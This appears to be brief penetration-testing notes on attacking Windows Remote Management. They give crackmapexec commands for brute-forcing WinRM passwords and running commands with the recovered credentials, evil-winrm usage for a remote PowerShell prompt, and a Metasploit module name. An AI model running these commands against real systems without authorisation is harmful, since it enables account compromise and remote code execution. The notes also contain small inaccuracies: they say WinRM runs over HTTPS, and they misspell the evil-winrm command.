- Windows Remote Management
- Happens over HTTPS
- PORT 5985 and 5986(HTTPS)

### Crackmapexec
```bash
crackmapexec <protocol> <ip>
```
- Bruteforce WinRM password using wordlist
```bash
crackmapexec winrm <ip> -u username -p /wordlist/password
```
- Command execution after bruteforce
```bash
crackmapexec winrm <ip> -u <username> -p <password> -x "command"
```

### Evil-winrm.rb
- Ruby script for getting a powershell prompt with winrm.
```bash
evil-winrm.eb -u <username> -p <password> -i <IP>
```

### Metasploit
```bash
exploit/windows/winrm/winrm_script_exec
```
